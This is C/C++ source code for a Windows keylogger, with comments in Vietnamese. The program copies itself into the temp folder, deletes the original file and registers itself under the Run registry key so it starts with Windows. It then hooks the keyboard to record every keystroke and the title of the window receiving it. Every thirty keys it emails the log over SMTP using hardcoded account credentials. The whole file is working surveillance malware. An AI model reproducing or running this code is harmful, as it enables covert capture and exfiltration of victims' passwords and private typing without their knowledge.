
#define _BASE64_H_
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <wincrypt.h>
#include "base64.h"
#include <shellapi.h>
// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma warning(disable : 4996)

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "587"
LRESULT CALLBACK MsgProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
//DWORD WINAPI MailSending(LPVOID lParam);

BOOL sendrequest(SOCKET ConnectSocket, const char* Buffer);
BOOL recvMail(SOCKET Socket);
int MailSending();


int g_time = 0;
HANDLE g_hLogFile;
HANDLE g_hExeFile;
HANDLE g_hExeTempFile;
HWND g_hWActiveOld = 0, g_hWActiveNew;
HINSTANCE z;
WCHAR g_LogPath[MAX_PATH] = { 0 };
using namespace std;
//------------------Main
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    WCHAR TempPath[MAX_PATH] = { 0 }; // Đặt = {0} thì sizeof() +0, ngược lại sizeof() +1

    WCHAR ExePath[MAX_PATH] = { 0 };
    WCHAR ExeTempPath[MAX_PATH] = { 0 };
    WCHAR ExeDelPath[MAX_PATH] = { 0 };

    HANDLE hExeDel;
    
    GetTempPath(MAX_PATH, TempPath);

    lstrcat(g_LogPath, TempPath);
    lstrcat(g_LogPath, L"keylog.log");
    lstrcat(ExeTempPath, TempPath);
    lstrcat(ExeTempPath, L"keylog.exe");

    DWORD sizeRW = 0;

    int result=0;
    GetModuleFileNameW(0, ExePath, MAX_PATH); // Path exe ở hiện tại
    lstrcat(ExeDelPath, TempPath);
    lstrcat(ExeDelPath, L"delfile.log");
    // Tạo file để lưu link Exe bên ngoài temp
    // Check xem file exe có phải trong temp không, nếu không thì copy nó vào temp
    // Và tạo file log lưu link EXE cũ
    if (lstrcmp(ExePath, ExeTempPath) != 0) // Nếu không có trong Temp
    {
        //Và tạo file log lưu link EXE cũ
        result = CopyFile(ExePath, ExeTempPath, FALSE);
        hExeDel = CreateFile(ExeDelPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
        result = WriteFile(hExeDel, ExePath, sizeof(WCHAR) * (lstrlen(ExePath)), &sizeRW, 0);
        CloseHandle(hExeDel);
        
        z = ShellExecute(NULL, NULL, ExeTempPath, NULL, NULL, SW_SHOWDEFAULT);
        Sleep(100);
        return 0;
    }
    else // Có trong Temp
    {
        // Nếu Mở được file chưa link exe ra thì lặp xóa file rồi xóa file link đi
        if ((hExeDel = CreateFile(ExeDelPath, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_DELETE, 0, OPEN_EXISTING, 0, 0)) != INVALID_HANDLE_VALUE)
        {
           // đọc file log lấy link
            int Rresult = ReadFile(hExeDel, ExeDelPath, sizeof(ExeDelPath), &sizeRW, 0);
            CloseHandle(hExeDel);
            for (int i=0;i<2;i++)
            {
                if(DeleteFile(ExeDelPath) != 0) // Delete file Bên ngoài
                    break;
                Sleep(500);
            }
            
            // Khởi động cùng Windows
            HKEY hkey;
            RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
            int i = RegSetValueEx(hkey, L"Keylog", NULL, REG_SZ, (const BYTE*)ExeTempPath, lstrlen(ExeTempPath) * sizeof(WCHAR)+1);
            RegCloseKey(hkey);
            //  Mở File Log để Ghi
            g_hLogFile = CreateFile(g_LogPath, GENERIC_ALL,FILE_SHARE_WRITE|FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
            HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)MsgProc, NULL, 0);// Bắt đầu HOOK
            //Sleep(10000);
            //HANDLE ThreadMail = CreateThread(0, 0, MailSending, 0, 0, 0);
        }

    }



    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {

        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}

//-----------------ProcWindow
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{

    return DefWindowProc(hwnd, uMsg, wParam, lParam);

}


LRESULT CALLBACK MsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT* KeyStruct = (KBDLLHOOKSTRUCT*)lParam;

    WCHAR namekey[65];
    WCHAR NameWindow[255];
    DWORD sizewrited = 0;
    int result;
    WCHAR EnterChar[2] = L"\n";
    switch (wParam)
    {
    case WM_KEYDOWN:
    {
        g_hWActiveNew = GetForegroundWindow();
        if (g_hWActiveNew != g_hWActiveOld)
        {
            ZeroMemory(NameWindow, sizeof(NameWindow));
            g_hWActiveOld = g_hWActiveNew;
            result = WriteFile(g_hLogFile, &EnterChar, sizeof(WCHAR) * (lstrlen(EnterChar)), &sizewrited, 0);
            GetWindowTextW(g_hWActiveNew, NameWindow, sizeof(NameWindow)/2);
            lstrcat(NameWindow, L":");
            result = WriteFile(g_hLogFile, &NameWindow, sizeof(WCHAR) * (lstrlen(NameWindow)), &sizewrited, 0);
        }
        ZeroMemory(namekey, sizeof(namekey));
        result = GetKeyNameTextW(KeyStruct->scanCode << 16, (LPWSTR)namekey, 65);
        lstrcat(namekey, L" ");
        result = WriteFile(g_hLogFile, &namekey,sizeof(WCHAR) * (lstrlen(namekey)), &sizewrited,0 );
        g_time += 1;
        if (g_time == 30)
        {
            SetFilePointer(g_hLogFile, 0, 0, FILE_BEGIN);
            MailSending();
            SetFilePointer(g_hLogFile, 0, 0, FILE_END);
            //MessageBoxA(0, "sendmail", "asd", MB_OK);
            g_time = 0;
        }
        break;
    }
    default:
        break;
    }



    return CallNextHookEx(0, nCode, wParam, lParam);
}

int MailSending()
{
    //LPVOID* hand = (LPVOID*)lParam;
    
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    const char* sendbuf = "EHLO";
    char recvbuf[DEFAULT_BUFLEN];

    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
        // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = 0;

    // Resolve the server address and port
    iResult = getaddrinfo("mail.google.com", DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }
    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }
    char Account[255] = "anhdz@gmail.com";
    char Password[255] = "chiu";

    //char HeaderData[1024] = "Subject:AnhDVd\r\nMIME - Version: 1.0\r\nContent - Type : multipart / mixed; boundary = \"KkK170891tpbkKk__FV_KKKkkkjjwq\"\r\n--KkK170891tpbkKk__FV_KKKkkkjjwq\r\nContent - Type:application / octet - stream\; name = \"Keylog.txt\"\r\nContent - Transfer - Encoding:base64\r\nContent - Disposition : attachment\; filename = \"Keylog.txt\"\r\n";

    // Account
    //int i = CryptStringToBinaryA((LPCSTR)Account, 0, CRYPT_STRING_ANY, (BYTE*)StrBase64, &StrBaseLen, 0, 0);

    recvMail(ConnectSocket);
    char SendTemp[512] = "EHLO anhdvd\r\n";
    sendrequest(ConnectSocket, SendTemp);
    recvMail(ConnectSocket);
    //Gui request Login
    ZeroMemory(SendTemp, sizeof(SendTemp));
    lstrcatA(SendTemp, "AUTH LOGIN\r\n");
    sendrequest(ConnectSocket, SendTemp);
    recvMail(ConnectSocket);
    //Mahoa base64
    string strAccount;
    string strPassword;
    strAccount = base64_encode((unsigned char*)Account, strlen((const char*)Account));
    strAccount += "\r\n";
    strPassword = base64_encode((unsigned char*)Password, strlen((const char*)Password));
    strPassword += "\r\n";

    ZeroMemory(SendTemp, sizeof(SendTemp));
    lstrcatA(SendTemp, (LPCSTR)strAccount.c_str());
    //lstrcpyA(SendTemp,)
    sendrequest(ConnectSocket, SendTemp);
    recvMail(ConnectSocket);
    //Pass
    ZeroMemory(SendTemp, sizeof(SendTemp));
    lstrcatA(SendTemp, (LPCSTR)strPassword.c_str());
    sendrequest(ConnectSocket, SendTemp);
    recvMail(ConnectSocket);
    //Send Mail 
    //FROM-----------------------------------------------------------------
    ZeroMemory(SendTemp, sizeof(SendTemp));
    lstrcatA(SendTemp, "MAIL FROM:<anhdvd@bkav.com>\r\n");
    sendrequest(ConnectSocket, SendTemp);
    recvMail(ConnectSocket);

    // TO------------------------------------------------
    ZeroMemory(SendTemp, sizeof(SendTemp));
    lstrcatA(SendTemp, "RCPT TO:<anhdvd@bkav.com>\r\n");
    sendrequest(ConnectSocket, SendTemp);
    recvMail(ConnectSocket);
    //--------------------------------DATA---------------------------
    //hExeDel = CreateFile(ExeDelPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, 0, OPEN_EXISTING, 0, 0)
    //DATA
    ZeroMemory(SendTemp, sizeof(SendTemp));
    lstrcatA(SendTemp, "DATA\r\n");
    sendrequest(ConnectSocket, SendTemp);
    recvMail(ConnectSocket);

    // Nối text ở đâyyyyyyyyyyyyyyyyyyyyyyyyyy
    char ReadtxtData[5000] = { 0 };
    DWORD sizeRW = 0;
    char DataTemp[5000];
    string filebase64;

    ZeroMemory(DataTemp, sizeof(DataTemp));
    //***************************************************** Tách từng dung để Attach *****************************
    iResult = send(ConnectSocket, "MIME-Version: 1.0\r\n", (int)strlen("MIME-Version: 1.0\r\n"), 0);
    iResult = send(ConnectSocket, "Content-Type:multipart/mixed;boundary=\"KkK170891tpbkKk__FV_KKKkkkjjwq\"\r\n", (int)strlen("Content-Type:multipart/mixed;boundary=\"KkK170891tpbkKk__FV_KKKkkkjjwq\"\r\n"), 0);
    iResult = send(ConnectSocket, "--KkK170891tpbkKk__FV_KKKkkkjjwq\r\n", (int)strlen("--KkK170891tpbkKk__FV_KKKkkkjjwq\r\n"), 0);
    iResult = send(ConnectSocket, "Content-Type:application/octet-stream;name=\"Keylog.txt\"\r\n", (int)strlen("Content-Type:application/octet-stream;name=\"Keylog.txt\"\r\n"), 0);
    iResult = send(ConnectSocket, "Content-Transfer-Encoding:base64\r\n", (int)strlen("Content-Transfer-Encoding:base64\r\n"), 0);
    iResult = send(ConnectSocket, "Content-Disposition:attachment;filename=\"Keylog.txt\"\r\n", (int)strlen("Content-Disposition:attachment;filename=\"Keylog.txt\"\r\n"), 0);
    iResult = send(ConnectSocket, "\r\n", (int)strlen("\r\n"), 0);
    // **************** ĐỌC FILE LẤY TEXT RỒI -> BASE64****************************************
    //HANDLE hTxt = CreateFileW(g_LogPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);

    ReadFile(g_hLogFile, ReadtxtData, 5000, &sizeRW, 0);
    //zerr = GetLastError();
    filebase64 = base64_encode((unsigned char*)ReadtxtData, sizeRW);//strlen((const char*)ReadtxtData)
    //****************************SEND TEXT
    ZeroMemory(DataTemp, sizeof(DataTemp));
    lstrcatA(DataTemp, filebase64.c_str());
    lstrcatA(DataTemp, "\r\n");
    sendrequest(ConnectSocket, DataTemp);
    //lstrcatA(DataTemp, "\n.\r\n");
    sendrequest(ConnectSocket, ".\r\n");
    recvMail(ConnectSocket);
    //********* QUIT***********************
    ZeroMemory(SendTemp, sizeof(SendTemp));
    lstrcatA(SendTemp, "QUIT\r\n");
    sendrequest(ConnectSocket, SendTemp);
    recvMail(ConnectSocket);

    Sleep(10000);
    closesocket(ConnectSocket);
    WSACleanup();
    

    return 0;
}

BOOL sendrequest(SOCKET Socket, const char* Buffer)
{
    int iResult;
    iResult = send(Socket, Buffer, (int)strlen(Buffer), 0);
    if (iResult == SOCKET_ERROR)
    {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(Socket);
        WSACleanup();
        return 1;
    }
    return 1;
}

BOOL recvMail(SOCKET Socket)
{
    int iResult;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    ZeroMemory(recvbuf, sizeof(recvbuf));
    iResult = recv(Socket, recvbuf, recvbuflen, 0);
    if (iResult > 0)
        printf("%s\n", recvbuf);
    else if (iResult == 0)
        printf("Connection closed\n");
    else
        printf("recv failed with error: %d\n", WSAGetLastError());
    return 1;
}
//// Mở file exe hiện tại và copy vào temp
//// HANDLE TempFile Set chế độ Write
//g_hExeTempFile = CreateFile(ExeTempPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, 0);
//// HANDLE exe current Set chế độ đọc
//g_hExeFile = CreateFile(ExePath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, 0);
//int result = ReadFile(g_hExeFile,)